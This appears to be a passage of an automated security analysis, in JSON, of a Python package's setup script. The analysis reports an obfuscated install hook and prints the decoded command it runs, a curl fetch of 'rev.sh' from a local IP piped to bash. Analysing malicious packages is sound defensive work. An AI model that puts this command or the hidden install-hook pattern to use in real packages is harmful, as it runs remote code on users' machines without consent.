{
  "purpose": "The code sets up a Python package with custom install and develop commands, and includes obfuscated code that executes a system command during installation.",
  "sources": "The function notmalfunc() calls os.system with decoded base64 string, which reads no external input but executes a system command.",
  "sinks": "os.system call with decoded base64 string is the main sink; it executes arbitrary code in the shell.",
  "flows": "The code decodes a base64 string in notmalfunc() and then executes it via os.system during package installation, representing a source-to-sink flow.",
  "anomalies": "Presence of base64 decoding and execution of decoded string as system command, which is obfuscated behavior. The base64 string decodes to 'curl -s http://192.168.1.34:8000/rev.sh | bash', indicating potential malicious activity.",
  "analysis": "The setup script defines functions and classes for package installation. The key point is the notmalfunc() which is invoked during the install process. It decodes a base64 string that, when decoded, runs a curl command piped to bash, potentially executing remote malicious code. This is highly suspicious and indicative of malicious intent, as it executes external code during package installation without user consent. The rest of the code is standard setup boilerplate, but the embedded obfuscated system call is a red flag.",
  "conclusion": "The code contains obfuscated malicious behavior that executes remote code during package installation, representing a security threat. The package is likely malicious or compromised.",
